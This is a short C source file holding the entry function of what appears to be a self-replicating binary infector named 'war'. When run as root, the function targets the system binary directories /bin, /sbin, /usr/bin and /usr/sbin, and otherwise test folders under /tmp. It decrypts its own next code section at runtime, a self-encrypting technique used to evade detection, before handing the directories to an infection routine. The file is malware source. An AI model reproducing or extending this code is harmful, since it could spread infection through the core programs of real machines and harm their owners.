#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void war(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	if (context == FAILURE)
		goto label;

	void *dir;
	size_t size;

	if (_getuid() == 0)
	{
		struct s_directory root[] =
		{
			(struct s_directory){"/bin/", 0},
			(struct s_directory){"/sbin/", 0},
			(struct s_directory){"/usr/bin/", 0},
			(struct s_directory){"/usr/sbin/", 0},
		};
		dir = root;
		size = sizeof(root) / sizeof(root[0]);
	}
	else
	{
		struct s_directory user[] =
		{
			(struct s_directory){"/tmp/test/", 0},
			(struct s_directory){"/tmp/test2/", 0},
		};
		dir = user;
		size = sizeof(user) / sizeof(user[0]);
	}

label:
	update_keychain_right(keychain, (char *)war, (void *)find_host - (void *)war);
	decrypt_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);

	find_host(host, keychain, dir, size, context);
}
